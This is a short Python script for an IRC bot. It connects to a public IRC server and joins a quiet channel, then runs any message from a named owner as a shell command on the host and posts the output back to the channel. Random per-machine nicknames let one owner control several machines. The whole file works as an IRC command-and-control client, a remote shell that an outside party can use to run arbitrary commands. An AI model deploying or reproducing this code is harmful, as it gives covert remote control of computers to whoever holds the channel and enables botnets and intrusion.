import sys 
import socket 
import string 
import os
import random

HOST='irc.freenode.net'  # Only been tested with freenode
PORT=6667 
NICK='BigData'+str(random.randint(1, 1000)) # Name it whatever 
# BigData + somenumber if you are going to have more than one machine
REALNAME = IDENT = "Something"+NICK 
 
OWNER='ChangeOwner' # Change this to your username 

CHANNELINIT='#ChangeChannel' #Something that people wont join iot limit noise 
readbuffer='' 

def parsemsg(msg): 
    wasDirected = 0
    complete=msg[1:].split(':',1)
    info=complete[0].split(' ') 
    msgpart=complete[1] 
    sender=info[0].split('!') 
    cmd = ''
    if sender[0]==OWNER: 
        cmd=msgpart
    if cmd != '':
        cmd = cmd.split()
        if '@' in cmd[0]:
            wasDirected = 1
            if cmd[0].replace('@','') not in NICK:
                return
        cmd = ' '.join(cmd[wasDirected:])
        commandOutput = os.popen(cmd).read()
        if commandOutput != '':
            commandOutput = commandOutput.split()
            s.send( 'PRIVMSG '+CHANNELINIT+' :'+str(commandOutput)+'\r\n' );


s=socket.socket( ) 
s.connect((HOST, PORT)) 
s.send('NICK '+NICK+'\r\n')  
s.send('USER '+IDENT+' '+HOST+' bla :'+REALNAME+'\r\n') 

while True: 
    line=s.recv(200)
    if line.find('Welcome ')!=-1: 
        s.send('JOIN '+CHANNELINIT+'\r\n') 
    if line.find(OWNER)!=-1 and line.find('JOIN')==-1: 
        line=line.rstrip() 
        parsemsg(line)
        
    if(line.find('PING')!=-1):
        pongData = line.split(':', 1)
        pongData = pongData[1].split(' ')
        s.send('PONG '+pongData[0]+'\r\n')
